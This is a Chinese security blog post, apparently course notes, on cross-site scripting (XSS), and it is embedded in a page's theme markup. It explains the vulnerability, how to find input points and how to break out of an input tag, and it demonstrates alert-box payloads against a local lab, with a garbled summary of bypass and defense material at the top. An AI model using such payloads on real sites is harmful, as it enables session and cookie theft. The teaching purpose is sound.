会被正常识别和翻译才是关键不是所有的编码都是可以的所以需要研究浏览器到底能够将哪些编码数据能够正常解码显示大家理解思路即可到底浏览器能不能解析谁也不能保准因为浏览器也一直在升级解析规则可能会发生变化浏览器解析顺序是这样的解析器解析器解析器解析器的解码是在后台服务检测之前的可以理解为后台收到后会自动进行解码然后才是执行开发人员编写的对中的值的检测函数首先编码作用不在于绕过后台检测但是当我们是方式提交数据时而我们提交的数据中进行了实体编码也就意味着存在这样的特殊字符这时就需要对这些特殊字符进行编码这样才会保证正常解析如果不进行编码的话就会把认为是空格了而也会是被认为用来连接中参数的连接符故需要进行编码如果是以方式传递值就不需要进行编码了解析器是用来解析代码的我们重点看的是实体编码解析器十进制或者十六进制编码解析器十六进制也就是编码相关的几种编码方式实体编码使用十进制的编码格式以符号开头分号结尾在线工具编码绕过之函数里面的函数把一些预定义字符转换为实体从而导致提交的标签再输出的时候变成了如下图所示预定义字符编码如下和号成为双引号成为单引号成为实体编码表该函数的语法过滤原理函数把预定义的字符转换为实体从而使攻击失效但是这个函数默认配置不会将单引号和双引号过滤只有设置了规定如何编码单引号和双引号才能会过滤掉单引号可用的类型默认仅编码双引号也就是默认情况下不对单引号进行处理编码双引号和单引号不编码任何引号如果程序员在开发的时候只是采用了函数的默认配置那么就可以使用进行绕过源代码如下所示之输出代码中函数采用了编码双引号和单引号如下所示此是我们再按以前的方法就不能绕过了我们可以输入进行绕过如下所示但是这里还是有个突破方法代码将输入的数据放入到了标签中后面有个单引号这样就能想办法执行我们的代码了看一下编码处理正常正常正常对中的内容进行编码中文转也就是所谓的编码不需要引号的数字弹框时编码之后不能弹框外层是单引号时内容可以解析并且有弹框外层是时内容不能解析但可以弹框对中的内容进行实体编码十进制编码转编码不需要引号的数字弹框时编码之后不能弹框外层是单引号时内容不能解析但能弹框外层是时内容不能解析但能弹框对整体进行实体编码十进制编码转编码不能解析之输出构建攻击代码前面的代码被闭合了后面写了新的标签内容从而导致弹窗之绕过什么是攻击手段获取是包含在响应头里面的一个附加的标识所以它是后端服务器对设置的一个附加的属性在生成时使用标志有助于减轻客户端脚本访问受保护的风险如果浏览器支持的话大多数攻击都是针对会话的盗窃后端服务器可以通过在其创建的上设置标志来帮助缓解此问题这表明该在客户端上不可访问如果支持的浏览器检测到包含标志的并且客户端脚本代码尝试读取该则浏览器将返回一个空字符串作为结果这会通过阻止恶意代码通常是将数据发送到攻击者的网站来使攻击失败如果响应标头中包含标志可选客户端脚本将无法访问如果浏览器支持该标志的话因此即使客端存在跨站点脚本漏洞浏览器也不会将透露给第三方但是如果浏览器不支持并且后端服务器设置了浏览器也会忽略标志从而创建传统的脚本可访问的那么该通常是会话容易受到攻击这里大家要注意一个问题不是防止攻击的而是防止攻击代码中的代码在浏览器上获取信息如果设置后就可以防止盗取的恶意代码执行设置方法如下确定字段的位置修改目录下的文件的源代码如下设置完成后重新登录查看已经被设置并且不能获取了各语言设置的添加属性没有这个属性的需要手动添加添加属性以前的版本只能通过添加对于以上版本参数的设置方法一在中设置其值为或者来开启全局的的属性方法二在代码中来开启方法三操作函数函数和函数也专门添加了第个参数来做为的选项开启方法为绕过参考文档我们登录后台有两种方式直接用户名和密码登录方式通过等认证信息直接登录大多数攻击都是针对会话的盗窃当用户通过用户名和密码登录某网站之后浏览器可能会提示他保存用户名和密码那么用户为了方便很有可能点击了保存如果是这种情况的话我们可以想办法来读取浏览器保存的用户名和密码信息如果用户登录之后没有保存那么我们可以采用表单劫持的方法来获取用户名和密码方法一表单劫持用户登录后未保存登录密码表单劫持的前提条件是登录页面存在存储型漏洞我们先通过这个漏洞注入我们的攻击代码攻击代码中包含获取表单数据并发送给攻击者网站的能力然后当其他用户访问登录页面的时候我们的攻击代码被加载执行了当用户输入完用户名和密码点击提交的时候给网站后台发送了请求的同时也给攻击者发送了用户名和密码当然也可以通过的键盘记录监控来获取用户输入的用户名和密码表单劫持的前提条件其实就不好满足所以表单劫持的这种手法比较鸡肋方法二获取浏览器保存的密码用户登录后保存了登录密码查看浏览器保存的登录密码六常规防范防御的总体思路对用户的输入和参数进行过滤就是对用户提交的所有内容进行过滤对中的参数进行过滤过滤掉会导致脚本执行的相关内容如特殊符号必须过滤掉单引号双引号尖括号之类的对输入的内容进行过滤可以分为黑名单过滤和白名单过滤黑名单过滤虽然可以拦截大部分的攻击但是还是存在被绕过的风险白名单过滤虽然可以基本杜绝攻击但是真实环境中一般是不能进行如此严格的白名单过滤的对输出进行编码过滤就是通过函数将用户的输入的数据进行编码使其不能作为脚本运行根据业务需求进行过滤比如输出点要求输入手机号则只允订输入手机号格式的数字转义所有输出到前端的数据都根据输出点进行转义比如输出到中讲行实体转义输入到里面的讲行转义之输出绕过直接代入标签里面一样可以绕过如果没有杷用户提交的数据交给标签其实很难绕过了之输出绕过还可以在服务端设置会话的属性这样客户端的脚本就不能获取信息了漏洞的修复总结因为漏洞涉及输入和输出两部分所以其修复也分两种过滤输入的数据包括等非法字符对输出到页面的数据进行相应的编码转换包括实体编码编码等',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2025-09-15 15:55:26',
  postMainColor: '',
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#18171d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#f7f9fe')
        }
      }
      const t = saveToLocal.get('theme')
    
          const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
          const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
          const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
          const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified

          if (t === undefined) {
            if (isLightMode) activateLightMode()
            else if (isDarkMode) activateDarkMode()
            else if (isNotSpecified || hasNoSupport) {
              const now = new Date()
              const hour = now.getHours()
              const isNight = hour <= 6 || hour >= 18
              isNight ? activateDarkMode() : activateLightMode()
            }
            window.matchMedia('(prefers-color-scheme: dark)').addListener(e => {
              if (saveToLocal.get('theme') === undefined) {
                e.matches ? activateDarkMode() : activateLightMode()
              }
            })
          } else if (t === 'light') activateLightMode()
          else activateDarkMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><meta name="generator" content="Hexo 7.3.0"></head><body data-type="anzhiyu"><div id="web_bg"></div><div id="an_music_bg"></div><div id="loading-box" onclick="document.getElementById(&quot;loading-box&quot;).classList.add(&quot;loaded&quot;)"><div class="loading-bg"><img class="loading-img nolazyload" alt="加载头像" src="/./assets/lbxw.jpg"/><div class="loading-image-dot"></div></div></div><script>const preloader = {
  endLoading: () => {
    document.getElementById('loading-box').classList.add("loaded");
  },
  initLoading: () => {
    document.getElementById('loading-box').classList.remove("loaded")
  }
}
window.addEventListener('load',()=> { preloader.endLoading() })
setTimeout(function(){preloader.endLoading();},10000)

if (true) {
  document.addEventListener('pjax:send', () => { preloader.initLoading() })
  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
}</script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.10/progress_bar/progress_bar.css"/><script async="async" src="https://cdn.cbd.int/pace-js@1.2.4/pace.min.js" data-pace-options="{ &quot;restartOnRequestAfter&quot;:false,&quot;eventLag&quot;:false}"></script><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><div id="nav-group"><span id="blog_name"><div class="back-home-button"><i class="anzhiyufont anzhiyu-icon-grip-vertical"></i><div class="back-menu-list-groups"><div class="back-menu-list-group"><div class="back-menu-list-title">网页</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://blog.anheyu.com/" title="安知鱼的博客"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/favicon.ico" alt="安知鱼的博客"/><span class="back-menu-item-text">安知鱼的博客</span></a><a class="back-menu-item" target="_blank" rel="noopener" href="https://blog.anheyu.com/" title="博客"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/favicon.ico" alt="博客"/><span class="back-menu-item-text">博客</span></a></div></div><div class="back-menu-list-group"><div class="back-menu-list-title">项目</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://image.anheyu.com/" title="安知鱼图床"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://image.anheyu.com/favicon.ico" alt="安知鱼图床"/><span class="back-menu-item-text">安知鱼图床</span></a></div></div></div></div><a id="site-name" href="/" accesskey="h"><div class="title">蜡笔小王的博客</div><i class="anzhiyufont anzhiyu-icon-house-chimney"></i></a><div id="he-plugin-simple"></div><script>var WIDGET = {
  "CONFIG": {
    "modules": "0124",
    "background": "2",
    "tmpColor": "FFFFFF",
    "tmpSize": "16",
    "cityColor": "FFFFFF",
    "citySize": "16",
    "aqiColor": "E8D87B",
    "aqiSize": "16",
    "weatherIconSize": "24",
    "alertIconSize": "18",
    "padding": "10px 10px 10px 10px",
    "shadow": "0",
    "language": "auto",
    "borderRadius": "20",
    "fixed": "true",
    "vertical": "top",
    "horizontal": "left",
    "left": "20",
    "top": "7.1",
    "key": "df245676fb434a0691ead1c63341cd94"
  }
}
</script><link rel="stylesheet" href="https://widget.qweather.net/simple/static/css/he-simple.css?v=1.4.0"/><script src="https://widget.qweather.net/simple/static/js/he-simple.js?v=1.4.0"></script></span><div class="mask-name-container"><div id="name-container"><a id="page-name" href="javascript:anzhiyu.scrollToDest(0, 500)">PAGE_NAME</a></div></div><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><i class="anzhiyufont anzhiyu-icon-box-archive faa-tada" style="font-size: 0.9em;"></i><span> 隧道</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><i class="anzhiyufont anzhiyu-icon-shapes faa-tada" style="font-size: 0.9em;"></i><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags faa-tada" style="font-size: 0.9em;"></i><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/link/"><i class="anzhiyufont anzhiyu-icon-link faa-tada" style="font-size: 0.9em;"></i><span> 友人帐</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/fcircle/"><i class="anzhiyufont anzhiyu-icon-artstation faa-tada" style="font-size: 0.9em;"></i><span> 朋友圈</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/comments/"><i class="anzhiyufont anzhiyu-icon-envelope faa-tada" style="font-size: 0.9em;"></i><span> 留言板</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 我的</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/music/"><i class="anzhiyufont anzhiyu-icon-music faa-tada" style="font-size: 0.9em;"></i><span> 音乐馆</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/bangumis/"><i class="anzhiyufont anzhiyu-icon-bilibili faa-tada" style="font-size: 0.9em;"></i><span> 追番页</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/album/"><i class="anzhiyufont anzhiyu-icon-images faa-tada" style="font-size: 0.9em;"></i><span> 相册集</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/air-conditioner/"><i class="anzhiyufont anzhiyu-icon-fan faa-tada" style="font-size: 0.9em;"></i><span> 小空调</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 关于</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><i class="anzhiyufont anzhiyu-icon-paper-plane faa-tada" style="font-size: 0.9em;"></i><span> 关于本人</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/essay/"><i class="anzhiyufont anzhiyu-icon-lightbulb faa-tada" style="font-size: 0.9em;"></i><span> 闲言碎语</span></a></li><li><a class="site-page child faa-parent animated-hover" href="javascript:toRandomPost()"><i class="anzhiyufont anzhiyu-icon-shoe-prints1 faa-tada" style="font-size: 0.9em;"></i><span> 随便逛逛</span></a></li></ul></div></div></div><div id="nav-right"><div class="nav-button" id="randomPost_button"><a class="site-page" onclick="toRandomPost()" title="随机前往一个文章" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-dice"></i></a></div><input id="center-console" type="checkbox"/><label class="widget" for="center-console" title="中控台" onclick="anzhiyu.switchConsole();"><i class="left"></i><i class="widget center"></i><i class="widget right"></i></label><div id="console"><div class="console-card-group-reward"><ul class="reward-all console-card"><li class="reward-item"><a href="/null" target="_blank"><img class="post-qr-code-img" alt="微信" src="/null"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="/null" target="_blank"><img class="post-qr-code-img" alt="支付宝" src="/null"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div><div class="console-card-group"><div class="console-card-group-left"><div class="console-card" id="card-newest-comments"><div class="card-content"><div class="author-content-item-tips">互动</div><span class="author-content-item-title"> 最新评论</span></div><div class="aside-list"><span>正在加载中...</span></div></div></div><div class="console-card-group-right"><div class="console-card tags"><div class="card-content"><div class="author-content-item-tips">兴趣点</div><span class="author-content-item-title">寻找你感兴趣的领域</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/Linux/" style="font-size: 1.05rem;">Linux<sup>1</sup></a><a href="/tags/SQL%E6%B3%A8%E5%85%A5/" style="font-size: 1.05rem;">SQL注入<sup>2</sup></a><a href="/tags/windows/" style="font-size: 1.05rem;">windows<sup>1</sup></a><a href="/tags/%E5%B7%A5%E5%85%B7/" style="font-size: 1.05rem;">工具<sup>1</sup></a><a href="/tags/%E6%BC%8F%E6%B4%9E/" style="font-size: 1.05rem;">漏洞<sup>8</sup></a><a href="/tags/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/" style="font-size: 1.05rem;">网络基础<sup>20</sup></a></div></div><hr/></div></div><div class="console-card history"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-box-archiv"></i><span>文章</span></div><div class="card-archives"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-archive"></i><span>归档</span></div><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2025/09/"><span class="card-archive-list-date">九月 2025</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">34</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2025/08/"><span class="card-archive-list-date">八月 2025</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">1</span><span>篇</span></div></a></li></ul></div><hr/></div></div></div><div class="button-group"><div class="console-btn-item"><a class="darkmode_switchbutton" title="显示模式切换" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-moon"></i></a></div><div class="console-btn-item" id="consoleHideAside" onclick="anzhiyu.hideAsideBtn()" title="边栏显示控制"><a class="asideSwitch"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></a></div><div class="console-btn-item" id="consoleMusic" onclick="anzhiyu.musicToggle()" title="音乐开关"><a class="music-switch"><i class="anzhiyufont anzhiyu-icon-music"></i></a></div></div><div class="console-mask" onclick="anzhiyu.hideConsole()" href="javascript:void(0);"></div></div><div class="nav-button" id="nav-totop"><a class="totopbtn" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i><span id="percent" onclick="anzhiyu.scrollToDest(0,500)">0</span></a></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);" title="切换"><i class="anzhiyufont anzhiyu-icon-bars"></i></a></div></div></div></nav><div id="post-info"><div id="post-firstinfo"><div class="meta-firstline"><a class="post-meta-original">原创</a><span class="post-meta-categories"><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-inbox post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%B8%97%E9%80%8F/" itemprop="url">渗透</a></span><span class="article-meta tags"><a class="article-meta__tags" href="/tags/%E6%BC%8F%E6%B4%9E/" tabindex="-1" itemprop="url"> <span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>漏洞</span></a></span></div></div><h1 class="post-title" itemprop="name headline">xss</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="anzhiyufont anzhiyu-icon-calendar-days post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" itemprop="dateCreated datePublished" datetime="2025-09-12T02:38:56.000Z" title="发表于 2025-09-12 10:38:56">2025-09-12</time><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-history post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" itemprop="dateCreated datePublished" datetime="2025-09-15T07:55:26.056Z" title="更新于 2025-09-15 15:55:26">2025-09-15</time></span></div><div class="meta-secondline"><span class="post-meta-separator"></span><span class="post-meta-pv-cv" id="" data-flag-title="xss"><i class="anzhiyufont anzhiyu-icon-fw-eye post-meta-icon"></i><span class="post-meta-label" title="阅读量">阅读量:</span><span id="busuanzi_value_page_pv"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-spin"></i></span></span><span class="post-meta-separator">       </span><span class="post-meta-position" title="作者IP属地为成都"><i class="anzhiyufont anzhiyu-icon-location-dot"></i>成都</span></div></div></div><section class="main-hero-waves-area waves-area"><svg class="waves-svg" xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M -160 44 c 30 0 58 -18 88 -18 s 58 18 88 18 s 58 -18 88 -18 s 58 18 88 18 v 44 h -352 Z"></path></defs><g class="parallax"><use href="#gentle-wave" x="48" y="0"></use><use href="#gentle-wave" x="48" y="3"></use><use href="#gentle-wave" x="48" y="5"></use><use href="#gentle-wave" x="48" y="7"></use></g></svg></section><div id="post-top-cover"><img class="nolazyload" id="post-top-bg" src=""></div></header><main id="blog-container"><div class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container" itemscope itemtype="https://wjh0527.github.io.git/2025/09/12/xss/"><header><a class="post-meta-categories" href="/categories/%E6%B8%97%E9%80%8F/" itemprop="url">渗透</a><a href="/tags/%E6%BC%8F%E6%B4%9E/" tabindex="-1" itemprop="url">漏洞</a><h1 id="CrawlerTitle" itemprop="name headline">xss</h1><span itemprop="author" itemscope itemtype="http://schema.org/Person">蜡笔小王</span><time itemprop="dateCreated datePublished" datetime="2025-09-12T02:38:56.000Z" title="发表于 2025-09-12 10:38:56">2025-09-12</time><time itemprop="dateCreated datePublished" datetime="2025-09-15T07:55:26.056Z" title="更新于 2025-09-15 15:55:26">2025-09-15</time></header><h1 id="XSS漏洞"><a href="#XSS漏洞" class="headerlink" title="XSS漏洞"></a><strong>XSS漏洞</strong></h1><p>-——————————————————————————</p>
<h2 id="O-课程内容"><a href="#O-课程内容" class="headerlink" title="Ø 课程内容"></a>Ø <strong>课程内容</strong></h2><p>l XSS介绍</p>
<p>l XSS常用的小工具</p>
<p>l XSS盗取cookie</p>
<p>l XSS绕过限制</p>
<p>l beef的使用</p>
<h2 id="O-课程目标"><a href="#O-课程目标" class="headerlink" title="Ø 课程目标"></a>Ø <strong>课程目标</strong></h2><p>l 掌握XSS漏洞的原理与危害</p>
<p>l 了解XSS绕过的方法</p>
<p>l 掌握XSS漏洞的利用方法</p>
<p>-——————————————————————————</p>
<h2 id="一、XSS介绍"><a href="#一、XSS介绍" class="headerlink" title="一、XSS介绍"></a>一、<strong>XSS介绍</strong></h2><h3 id="1-1-认识XSS"><a href="#1-1-认识XSS" class="headerlink" title="1.1 认识XSS"></a><strong>1.1 认识XSS</strong></h3><p>XSS ( cross-site script）跨站脚本自1996年诞生以来，一直被OWASP(open web application security project)评为十大安全漏洞中的第三威胁漏洞。也有黑客把xss当做新型的“缓冲区溢出攻击”，而JavaScript是新型的shellcode。</p>
<p>2011年6月份，国内最火的信息发布平台“新浪微博”爆发了xSs蠕虫攻击，仅持续16分钟，感染用户近33000个，危害十分严重。xss最大的特点就是能注入恶意的代码到用户浏览器的网页上，从而达到劫持用户会话的目的。</p>
<h3 id="1-2-什么是XSS跨站脚本"><a href="#1-2-什么是XSS跨站脚本" class="headerlink" title="1.2 什么是XSS跨站脚本"></a><strong>1.2 什么是XSS跨站脚本</strong></h3><p>是一种经常出现在web应用程序中的计算机安全漏洞，是由于web应用程序对用户的输入过滤不严而产生的。攻击者利用网站漏洞把恶意的脚本代码注入到网页中，当其他用户浏览这些网页时，就会执行其中的恶意代码，对受害用户可能采用cookie资料窃取，会话劫持，钓鱼欺骗等攻击手段。</p>
<h3 id="1-3-XSS漏洞原理"><a href="#1-3-XSS漏洞原理" class="headerlink" title="1.3 XSS漏洞原理"></a><strong>1.3 XSS漏洞原理</strong></h3><p>攻击者在有漏洞的前端页面嵌入恶意代码，导致受害者访问页面时不知情的情况下触发恶意代码，获取受害者关键信息。</p>
<p>形成XSS漏洞的原因本质上还是对输入输出的过滤限制不严格，导致精心构造的脚本输入后，在前端被当做有效代码并执行。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="file:///C:\Users\ADMINI~1\AppData\Local\Temp\ksohtml12400\wps5.jpg" alt="img"> </p>
<p>****举例：****<a target="_blank" rel="noopener" href="http://127.0.0.1/web/xss/xss1.php">http://127.0.0.1/web/xss/xss1.php</a>?</p>
<p>用firefox按F12进入html编辑器或者直接查看网页源代码</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="file:///C:\Users\ADMINI~1\AppData\Local\Temp\ksohtml12400\wps6.jpg" alt="img"> </p>
<p>寻找输入点，在输入点输入特殊字符&lt;&gt;’’等，查看是否存在拦截，并且通过编辑器查看输入后存放的位置</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="file:///C:\Users\ADMINI~1\AppData\Local\Temp\ksohtml12400\wps7.jpg" alt="img"> </p>
<p>发现没有过滤特殊字符后，就要考虑如何构造payload进行xss攻击了。开始分析漏洞页面，构建payload。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="file:///C:\Users\ADMINI~1\AppData\Local\Temp\ksohtml12400\wps8.jpg" alt="img"> </p>
<p>网页内容为输出后的显示，箭头部分是我们可控输入的部分<input type="text" value="123"></p>
<p><input>是一个空元素，所以在元素内是无论如何不能写入内容的，所以我们先要把<input>闭合掉，然后再插入我们的xsspayload。</p>
<p>我们预想的弹窗语句：<input type="text" value=" "><script>alert('xss')</script>“&gt; </p>
<p>Input是一个完整的元素后面跟一个新的元素标签<script>，此时的<script>已经包含在正文的body内，成为可以执行的新元素，那么此时弹窗语句可以顺利执行。所以我们往回推，为保证输入过后能成为上面的语句，我们应该怎么做呢？如首先输入一个">将input元素闭合，其次将后面的<script>内容输入即可。</p>
<p>payload："><script>alert('xss')</script>,我们尝试输入一下，成功弹窗。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="file:///C:\Users\ADMINI~1\AppData\Local\Temp\ksohtml12400\wps9.jpg" alt="img"> </p>
<h3 id="1-4-XSS的危害"><a href="#1-4-XSS的危害" class="headerlink" title="1.4 XSS的危害"></a><strong>1.4</strong> <strong>XSS的危害</strong></h3><p>网络钓鱼，包括盗取各类的用户账号</p>
<p>窃取用户cookie</p>
<p>窃取用户浏览请回话</p>
<p>强制弹出广告页面、刷流量网页挂马</p>
<p>提升用户权限，进一步渗透网站</p>
<p>传播跨站脚本蠕虫等</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="file:///C:\Users\ADMINI~1\AppData\Local\Temp\ksohtml12400\wps10.jpg" alt="img"> </p>
<h3 id="1-5-XSS漏洞的挖掘"><a href="#1-5-XSS漏洞的挖掘" class="headerlink" title="1.5 XSS漏洞的挖掘"></a><strong>1.5</strong> <strong>XSS漏洞的挖掘</strong></h3><p><em><strong>*黑盒测试*</strong></em></p>
<p>尽可能找到一切用户可控并且能够输出在页面代码中的地方，比如下面这些：</p>
<p>URL的每一个参数</p>
<p>URL本身</p>
<p>表单</p>
<p>搜索框</p>
<p><em><strong>*常见业务场景*</strong></em><em><strong>*:*</strong></em></p>
<p>重灾区：评论区、留言区、个人信息、订单信息等</p>
<p>针对型：站内信、网页即时通讯、私信、意见反馈</p>
<p>存在风险：搜索框、当前目录、图片属性等</p>
<h2 id="二、XSS分类"><a href="#二、XSS分类" class="headerlink" title="二、XSS分类"></a><strong>二、XSS分类</strong></h2><p>XSS攻击类型可以分为三种：****反射型、存储型、DOM型****。</p>
<h3 id="2-1-反射型XSS"><a href="#2-1-反射型XSS" class="headerlink" title="2.1 反射型XSS"></a><strong>2.1 反射型XSS</strong></h3><p>反射型XSS与服务端交互，但是交互的数据一般不会被存在数据库中，一次性，所见即所得，一般出现在查询类页面等。反射性XSS又称非持久型XSS，这种攻击方式往往具有一次性。</p>
<p>攻击方式：攻击者通过电子邮件等方式将包含xss代码的恶意链接发给目标用户。当目标用户访问该链接时，服务器接收该目标用户的请求并进行处理，然后服务器把带有XSS代码的数据发送给目标用户的浏览器，浏览器解析这段带有XSS代码的恶意脚本后,浏览器解析这段代码后就会触发xss攻击，完成攻击者想要的功能(获取cookies、url、浏览器信息、IP等等)。</p>
<h4 id="2-1-1-反射型XSS攻击举例"><a href="#2-1-1-反射型XSS攻击举例" class="headerlink" title="2.1.1 反射型XSS攻击举例"></a><strong>2.1.1 反射型XSS攻击举例</strong></h4><p>在“输入”表单中输入内容，单击“提交”按钮后，将输入的内容放到“输出”表单中，例如当输入“12”，单击“提交按钮”，“12”将被输出到“输出”表单中。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="file:///C:\Users\ADMINI~1\AppData\Local\Temp\ksohtml12400\wps11.jpg" alt="img"> </p>
<p>当访问<a target="_blank" rel="noopener" href="http://127.0.0.1/web/XSS/xss1.php?xss_input_value=%22%3E">http://127.0.0.1/web/XSS/xss1.php?xss_input_value=&quot;&gt;</a>&lt;img src&#x3D;1+onerror&#x3D;alert(‘xss’)&gt;</p>
